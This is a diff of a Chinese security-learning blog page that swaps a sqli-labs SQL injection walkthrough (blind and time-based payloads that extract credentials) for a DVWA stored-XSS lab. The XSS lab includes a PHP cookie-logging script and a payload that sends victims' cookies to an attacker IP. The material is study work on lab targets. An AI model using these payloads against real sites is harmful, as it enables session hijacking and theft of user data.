@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">sqllibs靶场温习(1-6) | 奇点的小屋！</title>
+  <title itemprop="name">XSS攻击实战 | 奇点的小屋！</title>
   
     <link rel="shortcut icon" href="/images/favicon.png">
   
@@ -298,11 +298,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alzwiF.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alz0G4.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alz0G4.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      sqllibs靶场温习(1-6)</h1>
+      XSS攻击实战</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -314,7 +314,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-8-13<span class="bull">
+        2020-9-20<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -328,35 +328,21 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>SQL注入的知识快忘完了，赶紧回顾一下。</p>
-<p>@<a href="目录">TOC</a></p>
-<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>判断注入类型：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1	&#x2F;&#x2F;错误</span><br><span class="line">1 and 1&#x3D;1		&#x2F;&#x2F;正常</span><br></pre></td></tr></table></figure>
-
-<p>第一关是字符型注入，其流程一般是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、判断注入点</span><br><span class="line">2、判断列数</span><br><span class="line">3、获取所有数据库名</span><br><span class="line">4、获取数据库所有表名</span><br><span class="line">5、获取字段名</span><br><span class="line">6、获取字段中的数据</span><br></pre></td></tr></table></figure>
-<p>判断注入点的时候，如果页面返回正常，说明使用的符号不是注入点；如果报错，说明就是注入点，从而可以进行下一步。</p>
-<p>靶场的Less-1就是常规的字符型注入</p>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>当输入<code>http://localhost/sqli-labs/Less-2/?id=1</code>回显正常，但是后面加上<code>‘</code>就回显错误，说明是整形注入，不需要闭合符号。</p>
-<p><img src="https://img-blog.csdnimg.cn/2020081113042414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>列数还是3。<br>按照第一关的步骤就行了。</p>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>每一关判断注入点都是最关键的<br><img src="https://img-blog.csdnimg.cn/20200811194546608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第三关的注入点<code>&#39;)</code>,知道了注入点按流程办事。</p>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>因为是靶场所以找到注入点不是很难都是很简单的符号，如果是实际环境就不好说了。常见的闭合符号：<code>’，“，‘），”）</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20200811195234645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在常规里找到了第四关的闭合符号。</p>
-<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>看了一下应该是盲注 ，先判断闭合点。这点与联合查询注入不一样了。<br>因为没有回显，只能根据浏览器的刷新时间判断是否正确。</p>
-<p>盲注也是分为三种布尔类型，时间盲注，报错盲注</p>
-<p>①布尔类型的盲注<br>先判断闭合点：<code>http://localhost/sqli-labs/Less-5/?id=1&#39; and 1=1 --+</code>  闭合符号为：<code>‘</code>且1=1为真，所以页面正常<br>和<code>http://localhost/sqli-labs/Less-5/?id=1&#39; and 1=2 --+</code>虽说闭合符号正常，但是1=2逻辑错误，页面不正常，这也就验证了我们的闭合点找的是对的。</p>
-<p>判断数据库长度：构造payload:<code>http://localhost/sqli-labs/Less-5/?id=1&#39; and  length(database())=1 --+</code> 依次增加数字，直到页面正常。</p>
-<p>判断数据库的名称: 构造payload：<code>?id=1&#39; and left((select database()),1)=&#39;s&#39;--+</code>或者<code>left((select database()),1)&lt;&#39;t&#39;</code>二分法，一个一个猜解就会找到数据库为security。</p>
-<p>爆表：<code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+</code>修改limit x,1和长度。</p>
-<p>爆列名：<code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; --+</code>第四列才是password</p>
-<p>爆值：<br>用户名：<code>?id=1&#39; and left((select username from users order by id limit 0,1),1)=&#39;d&#39; --+</code><br>密码：<code>?id=1&#39; and left((select password from users order by id limit 0,1),1)=&#39;d&#39; --+</code><br>用户名和密码的id要相对应。</p>
-<p>emmm真的很费劲</p>
-<p>②时间盲注</p>
-<p>判断闭合点语句：<code>?id=1&#39; and sleep(5)--+</code>选择时间长一点更有利于我们观察。<br>如果刷新时间长就说明闭合点找对了。</p>
-<p>判断数据库的长度：构造payload:<code>http://localhost/sqli-labs/Less-5/?id=1&#39; and if(length(database() )=8 ,sleep(5), 1)</code>刷新时间比较长的话就说明说句库的长度为8。</p>
-<p>剩下的把<code>if(length(database() )=8 ,sleep(5), 1)</code>换一下就行了。</p>
-<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>第六关的注入点换成了<code>&quot;</code>,剩下的步骤都一样。</p>
-<p>回头练习一遍，对sql注入有着更好的理解。</p>
+          <p>实验环境：<code>kail虚拟机与本机</code><br>先来kail里操作一波</p>
+<p>①开启kail的apache服务，开启命令<code>/etc/init.d/apache2 start</code><br><img src="https://img-blog.csdnimg.cn/20200920161040299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>第一步成功了！</p>
+<p>②进入/var/www/html/里创建新文件cookie.php,命令：<code>sudo touch cookie.php</code><br>③再用vi进行编辑，命令<code>sudo vi cookie.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie &#x3D; $_GET[&#39;cookie&#39;];</span><br><span class="line">$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;);</span><br><span class="line">$time &#x3D; date(&#39;Y-m-d g:i:s&#39;);</span><br><span class="line">$fp &#x3D; fopen(&quot;cookie.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>保存的命令<code>:wq</code>找了好久才找到的，保存好之后需要给我们的脚本提权。<br>④<br>我们需要手动创建一个cookie.txt文件并且对他进行修改<br>命令：<code>sudo touch cookie.txt</code>和<code>sudo chmod 777 cookie.txt</code><br><img src="https://img-blog.csdnimg.cn/202009201624520.png#pic_center" alt="在这里插入图片描述"></p>
+<p>⑤使用<code>ps aux | grep apache</code>枚举出apache服务的所属组<br><img src="https://img-blog.csdnimg.cn/20200920162626263.png#pic_center" alt="在这里插入图片描述"><br>⑥使用<code>chown www-data:www-data cookie.txt</code>更改一下，确保cookie.txt所有组已经成为了www-data</p>
+<p><img src="https://img-blog.csdnimg.cn/2020092016321035.png#pic_center" alt="在这里插入图片描述"><br>这步也已经🆗了</p>
+<p>⑦再使用<code>curl 192.168.132.144/cookie.php?cookie=1</code>试一下是否能正确写入数据<br><img src="https://img-blog.csdnimg.cn/20200920163425596.png#pic_center" alt="在这里插入图片描述"><br>Good!!!</p>
+<p>在本机的DVWA中找到XSS存储型漏洞(等级为low)</p>
+<p>我们构造payload：<code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://192.168.46.129/cookie.php?cookie=&#39;+document.cookie+&#39;&quot; width=0 height=0 &gt;&#39;)&lt;/script&gt;</code>并提交。</p>
+<p>注意将IP改为kail攻击机的IP</p>
+<p>由于对提交的评论有字符限制，我们可以修改最大字数限制<br><img src="https://img-blog.csdnimg.cn/20200920172616589.png#pic_center" alt="在这里插入图片描述"></p>
+<p>随便输入评论，我们这边查看cookie.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/20200920172743570.png#pic_center" alt="在这里插入图片描述"></p>
+<p>已经存进来了，至于拿到了cookie怎么用，我已经在前面讲过了</p>
 
         </div>
         <!-- .entry-content -->
@@ -385,36 +371,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/08/15/%E6%9A%91%E5%81%87%E7%BB%83%E4%B9%A0%E7%AC%AC%E5%85%AD%E5%91%A8(%E4%BA%8C)SQL%E6%B3%A8%E5%85%A5-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzJrq.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzJrq.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                暑假练习第六周(二)sql注入-双查询报错注入</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/08/05/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%94%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)php%E5%AD%A6%E4%B9%A0--%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="next">
+            <a href="/2020/09/19/%E6%AF%8F%E5%91%A8%E5%88%B7%E9%A2%98(%E4%B8%80)/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzNZV.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzNZV.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzBRJ.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzBRJ.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                暑假第五周练习(二)php学习--正则表达式</h3>
+                每周刷题(一)</h3>
                 <hr>
               </div>
             </a>
